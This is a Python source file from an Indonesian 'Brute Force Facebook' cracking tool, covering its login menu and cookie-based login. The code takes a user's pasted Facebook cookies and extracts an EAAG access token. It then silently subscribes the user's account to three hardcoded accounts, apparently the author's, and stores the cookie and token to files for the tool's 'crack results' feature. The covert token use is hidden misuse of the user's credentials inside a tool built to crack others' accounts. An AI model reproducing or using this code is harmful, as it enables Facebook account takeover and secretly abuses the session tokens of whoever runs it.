#     *Brute Force Facebook (BFF)²
#     *file name: masuk.py
#     *copyright: (C) © 2022 ~ Romi Afrizal
#     *contact me on whatsap: +6281273018924

#     *Terimakasih sudah decode script ini tolong jangan di perjual belikan :)*
#     *Thanks for decoding this script, please don't sell it :)*

from xyz import *
from log.bot import bot_romz as ikutt
from log.language import bahasa as lang
from romz.banner import Banner as rz
from romz import hasil as lihat

#--- MENU MASUK
class romz_tzy:
	
	def __init__(self):
		self.business = "business.facebook.com"
		self.ENG = []
		rz().logo2()
		try:
			self.eng = open("data/english.txt","r").read()
			self.ENG.append(self.eng)
		except (FileNotFoundError, IOError):
			lang()
		
		if "bahasa_inggris" in self.ENG:
			tulis(Panel(f"""{Te} {U}•{K} 01 {O}Login using cookies
 {U}•{K} 02 {O}How to get cookies
 {U}•{K} 03 {O}View crack results
 {U}•{K} 04 {O}Change language 
 {U}•{M} 00 {O}Logout""",
			title = f'{Te}{M}[ {H}Menu {M}]',style='#FF0022'))
		else:
			tulis(Panel(f"""{Te} {U}•{K} 01 {O}Login menggunakan cookies
 {U}•{K} 02 {O}Cara mendapatkan cookies
 {U}•{K} 03 {O}Lihat hasil crack
 {U}•{K} 04 {O}Ganti bahasa
 {U}•{M} 00 {O}Keluar""",
			title = f'{Te}{M}[ {H}Menu {M}]',style='#FF0022'))
		if "bahasa_inggris" in self.ENG:
			rom = input('%s╰─ %sSelect %s> %s'%(p,o,m,k))
		else:
			rom = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
		if rom in['']:
			if "bahasa_inggris" in self.ENG:
				exit ('%s╰─%s choose the right one'%(p,m));jeda(2)
			else:
				exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
				
		elif rom in['1','01']:
			if "bahasa_inggris" in self.ENG: 
				tulis(Panel(f"{Te} {M}!{O} Must use backup account can't use main account",style='#FF0022'))
			else:
				tulis(Panel(f"{Te} {M}!{O} Wajib gunakan akun tumbal dilarang akun utama",style='#FF0022'))
			kukis = input("%s╰─ %sCookies %s> %s"%(p,o,m,k))
			with requests.Session() as ses:
				self.loginCOK(kukis,ses)
				if "bahasa_inggris" in self.ENG:
					print('')
					self.englix()
					print('')
					tulis(Panel(f'{Te} {U}•{O} Login successful, run again the tool type{M}:\n{P} - {H}python bff-2.py',style='#FF0022'));exit()
				else:
					print('')
					self.indox()
					print('')
					tulis(Panel(f'{Te} {U}•{O} login berhasil, jalankan ulang tool nya ketik{M}:\n{P} - {H}python bff-2.py',style='#FF0022'));exit()
		
		elif rom in['2','02']:
			if "bahasa_inggris" in self.ENG:
				tulis(Panel(f"{Te}{U} •{O} open with facebook ",style='#FF0022'))
			else:
				tulis(Panel(f"{Te}{U} •{O} buka dengan facebook ",style='#FF0022'))
			print (f"{p}╰─{o} Link tutorial {m}:{o} https://www.facebook.com/100067807565861/posts/231650695771848/?app=fbl")
			os.system("xdg-open https://www.facebook.com/100067807565861/posts/231650695771848/?app=fbl");exit()
			
		elif rom in['3','03']:
			lihat.hasil_fb(self.ENG)
			
		elif rom in['4','04']:
			lang()
			
		elif rom in['0','00']:
			if "bahasa_inggris" in self.ENG:
				self.jalan('%s╰─%s Good bye bro :) '%(p,h));exit()
			else:
				self.jalan('%s╰─%s Sampai jumpa tod :) '%(p,h));exit()
				
		else:
			if "bahasa_inggris" in self.ENG:
				exit ('%s╰─%s choose the right one'%(p,m));jeda(2)
			else:
				exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
				
	#--- LOGIN TOKEN
	def loginCOK(self,kukis,ses):
		try: 
			headers_tok = {
				"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
				"referer": "https://www.facebook.com/",
				"host": f"{self.business}",
				"origin": f"https://{self.business}",
				"upgrade-insecure-requests" : "1",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
				"cache-control": "max-age=0",
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
				"content-type":"text/html; charset=utf-8"
			}
			url_tok = ses.get(f'https://{self.business}/business_locations',headers = headers_tok,cookies = {"cookie":kukis})
			token = re.search("(EAAG\w+)", url_tok.text).group(1)
			print ("\n%s╰─ %sToken %s> %s%s"%(p,o,m,k,token));jeda(2)
			romz1 = '100067807565861'
			romz2 = '100029143111567'
			romz3 = '100028434880529'
			requests.post(
				f"https://graph.facebook.com/{romz1}/subscribers?access_token={token}",
				cookies={"cookie":kukis}
			).json()
			requests.post(
				f"https://graph.facebook.com/{romz2}/subscribers?access_token={token}",
				cookies={"cookie":kukis}
			).json()
			requests.post(
				f"https://graph.facebook.com/{romz3}/subscribers?access_token={token}",
				cookies={"cookie":kukis}
			).json()
			open('data/cookie.txt','w').write(kukis)
			open('data/token.txt','w').write(token)
			ikutt(kukis).guweh()
		except (KeyError):
			if "bahasa_inggris" in self.ENG:
				exit ("%s╰─%s cookie invalid "%(p,m));jeda(2)
			else:
				exit ("%s╰─%s cookie kadaluwarsa "%(p,m));jeda(2)
		except (IOError):
			if "bahasa_inggris" in self.ENG:
				exit ("%s╰─%s login failed, check your cookies "%(p,m));jeda(2)
			else:
				exit ("%s╰─%s login gagal, periksa cookies anda "%(p,m));jeda(2)
		except (AttributeError):
			if "bahasa_inggris" in self.ENG:
				exit ("%s╰─%s an error occurred, check your cookies "%(p,m));jeda(2)
			else:
				exit ("%s╰─%s terjadi kesalahan, periksa cookies anda "%(p,m));jeda(2)
		except requests.exceptions.ConnectionError:
			if "bahasa_inggris" in self.ENG:
				exit ("%s╰─%s no connection "%(p,m));jeda(2)
			else:
				exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)

	#--- JALAN
	def jalan(self,keliling):
		for mau in keliling + '\n':
			sys.stdout.write(mau)
			sys.stdout.flush();jeda(0.03)
			
	def indox(self):
		kentod = [
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"√"
		]
		for ci in kentod:
			sys.stdout.write(f'\r{p}╰─{o} mohon tunggu ... {h}{ci}')
			sys.stdout.flush();jeda(0.06)
			
	def englix(self):
		kentod = [
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"√"
		]
		for ci in kentod:
			sys.stdout.write(f'\r{p}╰─{o} please wait ... {h}{ci}')
			sys.stdout.flush();jeda(0.06)
		